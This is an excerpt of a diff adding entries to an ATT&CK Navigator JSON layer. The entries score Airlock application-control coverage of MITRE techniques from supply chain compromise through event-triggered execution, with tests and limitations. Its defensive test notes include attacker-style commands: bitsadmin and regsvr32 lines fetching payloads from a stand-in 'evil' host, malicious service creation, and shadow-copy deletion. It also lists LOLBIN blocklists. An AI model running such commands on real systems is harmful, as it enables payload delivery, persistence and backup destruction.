+    {
+      "techniqueID": "T1195",
+      "score": 0,
+      "comment": "Supply chain compromise with valid publisher signatures. If compromised software is signed by a publisher trusted in Airlock policy, it passes. Unsigned/differently-signed supply chain payloads blocked. | Test: Unsigned supply chain payload -> blocked. Signed by compromised-but-trusted publisher -> allowed. | Limitations: Publisher trust is the gap. Hash-based trust is more granular. This is a fundamental supply chain risk for any trust model.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1195.001",
+      "score": 0,
+      "comment": "Same principle as parent. Compromised dependency signed by trusted publisher passes. | Test: Untrusted dependency DLL -> blocked. | Limitations: Signed by trusted publisher -> passes.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1195.002",
+      "score": 0,
+      "comment": "Same. Compromised software update with valid signature passes publisher trust. | Test: Unsigned update -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1195.003",
+      "score": 0,
+      "comment": "Compromise hardware supply chain. Physical hardware. Below software layer. | Limitations: Hardware security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1197",
+      "score": 1,
+      "comment": "BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation. | Test: bitsadmin /transfer job /download http://evil/payload.exe C:\\Temp\\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins. | Limitations: Download itself not prevented \u2014 only execution of downloaded payload.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1199",
+      "score": 0,
+      "comment": "Trusted relationship. Third-party access. Access mechanism, not file execution. Post-access Airlock enforces. | Test: Third party RDPs in, runs unsigned tool -> blocked. | Limitations: Access not prevented.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1200",
+      "score": 0,
+      "comment": "Hardware additions. Physical device. If device delivers malware, execution blocked. Device insertion not prevented. | Test: Rogue USB device drops malware -> malware blocked. | Limitations: Physical access/device insertion not Airlock scope.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1201",
+      "score": 0,
+      "comment": "Password policy discovery via net accounts. net.exe cannot be practically blocklisted. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1202",
+      "score": 1,
+      "comment": "Indirect command execution via trusted LOLBINs (pcalua.exe, forfiles.exe, etc). Launched payload must be trusted. The indirect launchers can be blocklisted. | Test: 1) forfiles /c C:\\Temp\\malware.exe -> malware blocked. 2) Blocklist pcalua.exe, forfiles.exe, SyncAppvPublishingServer.exe. | Limitations: Indirect launcher is trusted but payload is still checked at execution.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1203",
+      "score": 0,
+      "comment": "Exploitation for client execution is about abusing a vulnerability in a trusted application. The exploit runs inside the trusted process. Airlock doesn't detect or prevent the exploit itself. Post-exploitation payload execution is covered under the relevant execution techniques. | Limitations: Exploit prevention, patching, and EDR behavioral detection are the controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1204",
+      "score": 1,
+      "comment": "Core Airlock value. User double-clicks malicious file -> blocked by default-deny. Covers exe, script, installer, DLL. | Test: Copy unsigned exe/msi/script to desktop, double-click -> blocked. | Limitations: Social engineering itself not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1204.001",
+      "score": 1,
+      "comment": "Malicious link leads to file download. Downloaded payload must be trusted to execute. Airlock blocks the execution regardless of how the file was obtained. | Test: Click link -> download unsigned exe -> attempt to run -> blocked. | Limitations: Link clicking itself not prevented. Browser-only attacks (credential phishing pages) not in scope \u2014 that's web filtering/proxy.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1204.002",
+      "score": 1,
+      "comment": "Direct hit. Malicious file opened by user -> blocked. Covers email attachments, USB, downloads. MSI via script control. Macro-enabled docs: doc opens, dropped payload blocked. | Test: 1) Unsigned exe from email -> blocked. 2) Malicious .msi -> blocked. 3) Macro doc drops exe -> exe blocked. | Limitations: Doc opens in trusted Office. Macro code runs inside Office.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1204.004",
+      "score": 1,
+      "comment": "Pasted commands run inside trusted interpreter (not inspected). But any untrusted payload the pasted command tries to execute IS blocked. Blocklisting interpreters for non-admins prevents the paste target entirely. | Test: 1) Paste download cradle into PS -> download succeeds, dropped exe blocked. 2) Blocklist PS for non-admins -> user can't open interpreter to paste into. | Limitations: Inline commands in trusted interpreter not inspected. Blocking the interpreter is the strongest control.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1204.005",
+      "score": 1,
+      "comment": "DLL/library control blocks untrusted native libraries at load time. npm/pip packages with malicious native extensions blocked. | Test: npm install with malicious native addon (.dll) -> blocked. | Limitations: Pure interpreted library code needs script control.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1205",
+      "score": 0,
+      "comment": "Traffic signaling / port knocking. Network-level. No file execution. | Limitations: Network security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1205.001",
+      "score": 0,
+      "comment": "Port knocking. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1205.002",
+      "score": 0,
+      "comment": "Socket filters. Kernel-level network manipulation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1207",
+      "score": 0,
+      "comment": "Rogue domain controller. AD-level attack. Not file execution. | Limitations: AD security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1210",
+      "score": 0,
+      "comment": "Exploitation of remote services is about abusing a vulnerability in a remote service (e.g., SMB, RDP, SQL). The exploit targets the service itself. Airlock doesn't prevent exploits. Post-exploitation tool deployment on the target is covered under execution techniques. | Limitations: Patching, network segmentation, and EDR are the controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1211",
+      "score": 0,
+      "comment": "Exploitation for defense evasion is about abusing a vulnerability to bypass security controls. The exploit itself runs inside a trusted process. Airlock doesn't detect or prevent exploits. | Limitations: Exploit prevention, patching, and EDR behavioral detection are the controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1212",
+      "score": 0,
+      "comment": "Exploitation for credential access is about abusing a vulnerability to obtain credentials. The exploit itself runs inside a trusted process or against a service. Airlock doesn't detect or prevent exploits. | Limitations: Exploit prevention, patching, and EDR behavioral detection are the controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1213",
+      "score": 0,
+      "comment": "Data from information repositories. Reading data from wikis/SharePoint. Data/network operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1213.002",
+      "score": 0,
+      "comment": "SharePoint. Network/API access.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1213.006",
+      "score": 0,
+      "comment": "Databases. Network/API access.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1216",
+      "score": 1,
+      "comment": "System script proxy execution (parent). Signed scripts used to execute code. Scripts can be blocklisted. | Test: Blocklist known proxy scripts. Payload loaded by proxy must be trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1216.001",
+      "score": 1,
+      "comment": "PubPrn.vbs. Signed VBScript for proxy execution. Can be blocklisted or covered by script control. | Test: Blocklist PubPrn.vbs or block via script control if modified (hash change). | Limitations: Original signed PubPrn.vbs may be trusted by publisher.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1216.002",
+      "score": 1,
+      "comment": "SyncAppvPublishingServer. Can execute PowerShell. The PS code must pass script control. | Test: Blocklist SyncAppvPublishingServer.exe. PS script it invokes checked by script control.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1217",
+      "score": 0,
+      "comment": "Browser information discovery. Reading browser data. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1218",
+      "score": 1,
+      "comment": "System binary proxy execution (parent). LOLBINs used to execute code bypassing application controls. Airlock has predefined blocklist packages for these. DLL/script payloads must be trusted. This is a key defense area for Airlock. | Test: Import LOLBAS/Microsoft Recommended Block Rules predefined blocklist. Payloads loaded by LOLBINs must be trusted regardless. | Limitations: Comprehensive LOLBIN defense with blocklist + payload control.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.001",
+      "score": 1,
+      "comment": "Compiled HTML (.chm). hh.exe opens CHM files. Content inside CHM can launch processes. Launched process must be trusted. hh.exe can be blocklisted. | Test: 1) CHM launching untrusted exe -> blocked. 2) Blocklist hh.exe. | Limitations: CHM HTML content inside hh.exe context may execute some scripts.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.002",
+      "score": 1,
+      "comment": "Control panel items (.cpl). CPL files are DLLs. Must be trusted. | Test: Malicious .cpl (DLL) -> blocked at load.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.003",
+      "score": 1,
+      "comment": "CMSTP. Can install/execute COM scriptlets. cmstp.exe can be blocklisted. Loaded DLLs must be trusted. | Test: 1) Blocklist cmstp.exe. 2) CMSTP loading untrusted DLL -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.004",
+      "score": 1,
+      "comment": "InstallUtil. .NET utility executing assemblies. Can be blocklisted. Loaded assemblies (DLLs) must be trusted. | Test: 1) Blocklist installutil.exe. 2) InstallUtil loading untrusted assembly -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.005",
+      "score": 1,
+      "comment": "Mshta. HTML application host. Can execute VBScript/JScript. Covered by script control. Can be blocklisted. Predefined in blocklist packages. | Test: 1) Blocklist mshta.exe. 2) HTA file -> script control blocks untrusted content. | Limitations: Key LOLBIN. Blocklist strongly recommended.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.007",
+      "score": 1,
+      "comment": "MSI files are covered by script control - untrusted MSI files blocked at execution. DLLs loaded by MSI must be trusted via DLL control. Note: msiexec.exe itself cannot be practically blocklisted as it is used by Windows for all MSI-based installations. Script control on the MSI file is the primary defense. | Test: 1) Untrusted .msi file -> blocked by script control. 2) MSI loading untrusted DLL during install -> DLL blocked. | Limitations: msiexec.exe cannot be blocklisted. Trusted-signed MSIs f",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.008",
+      "score": 1,
+      "comment": "Odbcconf. Can execute DLLs. Can be blocklisted. DLL must be trusted. | Test: 1) Blocklist odbcconf.exe. 2) Odbcconf loading untrusted DLL -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.009",
+      "score": 1,
+      "comment": "Regsvcs/Regasm. .NET registration utilities. Execute assemblies. Can be blocklisted. Assemblies must be trusted. | Test: 1) Blocklist regsvcs/regasm. 2) Loaded assembly must be trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.010",
+      "score": 1,
+      "comment": "Regsvr32 proxy execution technique. Any DLL that regsvr32 attempts to load must be trusted via DLL control. Untrusted DLLs blocked at load time regardless of how regsvr32 is invoked. Note: blanket blocklisting regsvr32.exe is impractical as it is used by Windows for legitimate COM registration. DLL control is the primary defense. | Test: 1) regsvr32 untrusted.dll -> DLL blocked at load. 2) regsvr32 /s /n /u /i:http://evil/script scrobj.dll -> if scrobj.dll payload writes untrusted DLL, blocked. ",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.011",
+      "score": 1,
+      "comment": "Rundll32 executes DLL exports. Any DLL passed to rundll32 must be trusted via DLL control. Untrusted DLLs blocked at load time. Note: blanket blocklisting rundll32.exe is impractical as it is used by Windows for Control Panel, shell extensions, and system operations. Restricting rundll32 for non-admins via metarule is possible but aggressive - evaluate operational impact. DLL control is the primary defense. | Test: rundll32 C:\\Temp\\untrusted.dll,EntryPoint -> DLL blocked at load. DLL control cat",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.012",
+      "score": 1,
+      "comment": "Verclsid. COM CLSID verification. Loads DLLs. DLL must be trusted. | Test: Verclsid loading untrusted DLL -> blocked. | Limitations: Niche LOLBIN.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.013",
+      "score": 1,
+      "comment": "Mavinject. DLL injection utility. Can be blocklisted. DLL must be trusted. | Test: 1) Blocklist mavinject.exe. 2) Mavinject loading untrusted DLL -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.014",
+      "score": 1,
+      "comment": "MMC. Snap-in execution via .msc files. Snap-in DLLs must be trusted. | Test: MMC loading untrusted snap-in DLL -> blocked. | Limitations: MMC itself is trusted. Snap-in DLLs are the control point.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1218.015",
+      "score": 1,
+      "comment": "Untrusted Electron app exe blocked by default-deny. If Electron app is trusted, its bundled JS runtime executes in-process. | Test: Untrusted Electron app exe -> blocked. | Limitations: Trusted Electron apps run their bundled code in-process \u2014 not separately controlled.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1219",
+      "score": 1,
+      "comment": "Remote access tools (Cobalt Strike, AnyDesk, TeamViewer, etc) must be allowlisted. Unauthorized RATs blocked. | Test: 1) Cobalt Strike beacon -> blocked. 2) AnyDesk not allowlisted -> blocked. | Limitations: RATs signed by trusted publisher may pass publisher trust. Blocklist specific unwanted RATs.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1219.001",
+      "score": 1,
+      "comment": "IDE tunneling. IDE tools (VS Code Remote) must be allowlisted. | Test: VS Code Remote tunnel binary not allowlisted -> blocked. | Limitations: If IDE legitimately trusted, tunnel works.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1219.002",
+      "score": 1,
+      "comment": "Remote desktop software. RMM tools must be allowlisted. | Test: Unauthorized RMM tool exe -> blocked. | Limitations: Legitimately deployed RMM tools are trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1219.003",
+      "score": 0,
+      "comment": "Remote access hardware. Physical devices. Not software.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1220",
+      "score": 1,
+      "comment": "XSL script processing. msxsl.exe can be blocklisted. wmic with /format:xsl \u2014 payload scripts checked by script control. | Test: 1) Blocklist msxsl.exe. 2) XSL script payload checked via script control. | Limitations: wmic.exe with /format:xsl harder to control without blocklisting wmic itself.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1221",
+      "score": 1,
+      "comment": "Template injection in Office docs. Remote template loads in trusted Office. Macro code runs inside Office. Dropped payloads blocked. | Test: Remote template macro drops exe -> exe blocked. | Limitations: Macro code runs inside trusted Office process.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1222",
+      "score": 1,
+      "comment": "Permission modification tools (icacls, takeown) restrictable via blocklist metarule. | Test: Blocklist icacls.exe and takeown.exe for non-admins. | Limitations: PowerShell alternatives still available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1222.001",
+      "score": 1,
+      "comment": "icacls.exe and takeown.exe: restrict via blocklist metarule for non-admins. | Test: Blocklist icacls.exe and takeown.exe for non-admins. | Limitations: PowerShell Set-Acl available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1480",
+      "score": 0,
+      "comment": "Execution guardrails. If malware is untrusted, blocked before guardrails checked. | Limitations: Malware can't execute to check guardrails.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1480.001",
+      "score": 0,
+      "comment": "Environmental keying. Same as parent. | Test: Same as T1480.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1480.002",
+      "score": 0,
+      "comment": "Mutual exclusion. Same as parent. | Test: Same as T1480.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1482",
+      "score": 1,
+      "comment": "nltest.exe and dsquery.exe: restrict via blocklist metarule for non-admins. | Test: Blocklist nltest.exe and dsquery.exe for non-admins. | Limitations: PowerShell Get-ADTrust available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1484",
+      "score": 0,
+      "comment": "Domain/tenant policy modification. AD/cloud policy changes. No file execution. | Limitations: AD security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1484.001",
+      "score": 0,
+      "comment": "Group policy modification. AD operation. | Limitations: If modified GPO delivers untrusted software, execution blocked on endpoints.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1484.002",
+      "score": 0,
+      "comment": "Trust modification. AD trust changes.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1485",
+      "score": 1,
+      "comment": "Custom wiper tools blocked by default-deny. Built-in destruction tools (format.com, cipher.exe) restrictable via blocklist metarule. | Test: 1) Custom wiper -> blocked. 2) Blocklist format.com for non-admins. 3) Blocklist cipher.exe for non-admins. | Limitations: del command runs inside trusted cmd.exe \u2014 hard to blocklist del specifically without blocking cmd. Blocklist cmd.exe for non-admins for maximum restriction.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1486",
+      "score": 1,
+      "comment": "Data encrypted for impact (ransomware). Ransomware executable must be trusted. This is Airlock's marquee use case. | Test: Ransomware exe dropped via any method -> blocked. Ransomware DLL -> blocked. Ransomware script -> blocked. | Limitations: Ransomware running inside already-trusted process (e.g., after injection) not caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1489",
+      "score": 1,
+      "comment": "Airlock agent specifically protected by kernel driver against stop attempts. For other services: sc.exe and net.exe are core Windows utilities that cannot be practically blocklisted. Standalone service manipulation tools blocked by default-deny. | Test: 1) net stop airlock / sc stop airlock -> kernel driver prevents. 2) Standalone service manipulation tool -> blocked (untrusted). | Limitations: sc.exe and net.exe cannot be practically blocklisted. Other services can be stopped with built-in tool",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1490",
+      "score": 1,
+      "comment": "vssadmin.exe and bcdedit.exe: restrict via blocklist metarule for non-admins. Prevents shadow copy deletion and boot config modification \u2014 key ransomware precursors. | Test: 1) Blocklist vssadmin.exe for non-admins -> prevents 'vssadmin delete shadows'. 2) Blocklist bcdedit.exe for non-admins -> prevents boot config tampering. 3) Blocklist wbadmin.exe for non-admins -> prevents backup deletion. | Limitations: Admin-exempted users can still use these. PowerShell WMI shadow copy deletion possible ",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1491",
+      "score": 0,
+      "comment": "Defacement. Modifying content. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1491.001",
+      "score": 0,
+      "comment": "Internal defacement. Data modification.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1491.002",
+      "score": 0,
+      "comment": "External defacement. Server-side.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1495",
+      "score": 0,
+      "comment": "Firmware corruption. Below OS. Hardware/firmware level. | Limitations: If firmware update tool is untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1496",
+      "score": 0,
+      "comment": "Resource hijacking (parent). Cryptominer must be trusted. | Test: Cryptominer exe -> blocked. | Limitations: Miner in trusted process (JS in browser) not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1496.001",
+      "score": 1,
+      "comment": "Cryptominer executables must be trusted. xmrig and similar tools blocked by default-deny. | Test: xmrig.exe not allowlisted -> blocked. | Limitations: Browser-based miners (JS in page) not caught \u2014 runs inside trusted browser process.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1496.002",
+      "score": 0,
+      "comment": "Bandwidth hijacking. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1497",
+      "score": 0,
+      "comment": "VM/sandbox evasion checks. If malware is untrusted, blocked before it can check.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1497.001",
+      "score": 0,
+      "comment": "System checks. Same. | Test: Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1497.002",
+      "score": 0,
+      "comment": "User activity checks. Same. | Test: Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1497.003",
+      "score": 0,
+      "comment": "Time based checks. Same. | Test: Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1498",
+      "score": 0,
+      "comment": "Network DoS. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1498.001",
+      "score": 0,
+      "comment": "Direct network flood. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1498.002",
+      "score": 0,
+      "comment": "Reflection amplification. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1499",
+      "score": 0,
+      "comment": "Endpoint DoS. Resource exhaustion. Behavioral. | Limitations: DoS tool must be trusted.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1499.001",
+      "score": 0,
+      "comment": "OS exhaustion flood. Network/resource.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1499.002",
+      "score": 0,
+      "comment": "Service exhaustion flood. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1499.003",
+      "score": 0,
+      "comment": "Application exhaustion flood. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1499.004",
+      "score": 0,
+      "comment": "Application/system exploitation. Exploit. In-memory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1505",
+      "score": 1,
+      "comment": "Web shell scripts (.aspx/.asp/.php) blocked by script control if file type is configured. Compiled DLL components blocked by DLL control. Airlock deploys to servers \u2014 web shells and malicious IIS/Exchange components are directly controlled. | Test: Upload untrusted .aspx web shell -> blocked by script control. Untrusted IIS module DLL -> blocked. | Limitations: Script control must cover the relevant web script file types.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1505.001",
+      "score": 0,
+      "comment": "SQL stored procedures. Inside trusted SQL Server. No file execution. | Limitations: xp_cmdshell spawning processes -> those processes checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1505.002",
+      "score": 1,
+      "comment": "Transport agent. Exchange transport agent DLL. Must be trusted. | Test: Untrusted transport agent DLL -> blocked at load. | Limitations: Exchange-specific.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1505.003",
+      "score": 1,
+      "comment": "Web shells. Script files deployed to web server. If type covered by script control, blocked. Compiled DLLs blocked. | Test: Upload untrusted .aspx with script control -> blocked. | Limitations: Requires script control for web script types.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1505.004",
+      "score": 1,
+      "comment": "IIS native modules (DLL). Must be trusted. | Test: Install untrusted IIS module DLL -> blocked. | Limitations: Module registration not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1505.005",
+      "score": 1,
+      "comment": "Terminal services DLL. Must be trusted to load. | Test: Untrusted terminal services DLL -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1518",
+      "score": 0,
+      "comment": "Software discovery. Reading installed software. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1518.001",
+      "score": 0,
+      "comment": "Security software discovery. Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1518.002",
+      "score": 0,
+      "comment": "Backup software discovery. Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1529",
+      "score": 1,
+      "comment": "shutdown.exe restrictable via blocklist metarule. | Test: Blocklist shutdown.exe for non-admins. | Limitations: Forced reboot via other methods (API calls from trusted process) not caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1531",
+      "score": 0,
+      "comment": "Account access removal. Identity operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1534",
+      "score": 1,
+      "comment": "Internal spearphishing. Phishing from compromised internal account. Payload must be trusted. | Test: Internal phishing email with malicious attachment -> blocked on victim. | Limitations: Email delivery not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1539",
+      "score": 0,
+      "comment": "Steal web session cookie. Browser data access. No new file execution typically. | Limitations: If cookie stealer tool is untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1542",
+      "score": 0,
+      "comment": "Pre-OS boot. Firmware/bootkit operates below OS. Airlock kernel driver loads after OS boot. | Test: N/A - below OS level. | Limitations: Secure Boot is the control here.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1542.001",
+      "score": 0,
+      "comment": "System firmware. Below OS. | Limitations: UEFI security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1542.002",
+      "score": 0,
+      "comment": "Component firmware. Below OS. | Limitations: Hardware security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1542.003",
+      "score": 0,
+      "comment": "Bootkit. Below OS level. | Limitations: Secure Boot/ELAM territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1543",
+      "score": 1,
+      "comment": "Service creation succeeds (sc create not prevented - sc.exe cannot be practically blocklisted). Service binary blocked at start if untrusted. This is the primary control - the attacker can register the service but the untrusted payload cannot execute. | Test: sc create evilsvc binPath= C:\\Temp\\evil.exe -> creation OK. sc start evilsvc -> binary blocked (untrusted). | Limitations: Service creation not prevented. sc.exe cannot be practically blocklisted. Airlock controls the execution of the servi",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1543.003",
+      "score": 1,
+      "comment": "Windows Service binary/DLL must be trusted. Service DLLs loaded via svchost blocked by DLL control. sc.exe cannot be practically blocklisted but the service binary is the control point. | Test: 1) sc create with unsigned exe -> start blocked. 2) Malicious svchost service DLL -> blocked by DLL control. | Limitations: Service creation not prevented. sc.exe cannot be practically blocklisted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546",
+      "score": 1,
+      "comment": "Event triggered execution (parent). Code launched by event triggers must be trusted. | Test: Varies by sub-technique. Trigger registers OK, payload blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.001",
+      "score": 1,
+      "comment": "Change default file association. Handler exe must be trusted. | Test: assoc .txt to evil handler exe -> exe blocked when .txt opened. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.002",
+      "score": 1,
+      "comment": "Screensaver .scr (PE executable). Must be trusted. | Test: Set screensaver to untrusted .scr -> blocked on activation. | Limitations: .scr files are PE executables, full allowlist enforcement.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
